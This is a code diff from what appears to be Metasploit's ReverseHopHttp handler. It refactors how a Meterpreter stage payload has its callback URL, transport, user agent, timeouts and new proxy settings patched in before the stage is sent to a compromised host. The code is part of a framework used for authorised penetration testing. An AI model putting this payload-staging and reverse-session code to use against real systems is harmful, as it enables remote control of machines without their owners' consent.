@@ -84,7 +84,7 @@ module ReverseHopHttp
       return
     end
 
-    # Sometimes you just have to do everything yourself. 
+    # Sometimes you just have to do everything yourself.
     # Declare ownership of this hop and spawn a thread to monitor it.
     self.refs = 1
     ReverseHopHttp.hop_handlers[full_uri] = self
@@ -247,40 +247,20 @@ module ReverseHopHttp
 
     print_status("Preparing stage for next session #{conn_id}")
     blob = stage_payload
-
-    # Replace the user agent string with our option
-    i = blob.index("METERPRETER_UA\x00")
-    if i
-      str = datastore['MeterpreterUserAgent'][0,255] + "\x00"
-      blob[i, str.length] = str
-    end
-
-    # Replace the transport string first (TRANSPORT_SOCKET_SSL)
-    i = blob.index("METERPRETER_TRANSPORT_SSL")
-    if i
-      str = "METERPRETER_TRANSPORT_HTTP#{ssl? ? "S" : ""}\x00"
-      blob[i, str.length] = str
-    end
-
-    conn_id = generate_uri_checksum(URI_CHECKSUM_CONN) + "_" + Rex::Text.rand_text_alphanumeric(16)
-    i = blob.index("https://" + ("X" * 256))
-    if i
-      url = full_uri + conn_id + "/\x00"
-      blob[i, url.length] = url
-    end
-    print_status("Patched URL at offset #{i}...")
-
-    i = blob.index([0xb64be661].pack("V"))
-    if i
-      str = [ datastore['SessionExpirationTimeout'] ].pack("V")
-      blob[i, str.length] = str
-    end
-
-    i = blob.index([0xaf79257f].pack("V"))
-    if i
-      str = [ datastore['SessionCommunicationTimeout'] ].pack("V")
-      blob[i, str.length] = str
-    end
+    #
+    # Patch options into the payload
+    #
+    Rex::Payloads::Meterpreter::Patch.patch_passive_service! blob,
+      :ssl            => ssl?,
+      :url            => url,
+      :expiration     => datastore['SessionExpirationTimeout'],
+      :comm_timeout   => datastore['SessionCommunicationTimeout'],
+      :ua             => datastore['MeterpreterUserAgent'],
+      :proxyhost      => datastore['PROXYHOST'],
+      :proxyport      => datastore['PROXYPORT'],
+      :proxy_type     => datastore['PROXY_TYPE'],
+      :proxy_username => datastore['PROXY_USERNAME'],
+      :proxy_password => datastore['PROXY_PASSWORD']
 
     blob = encode_stage(blob)
 
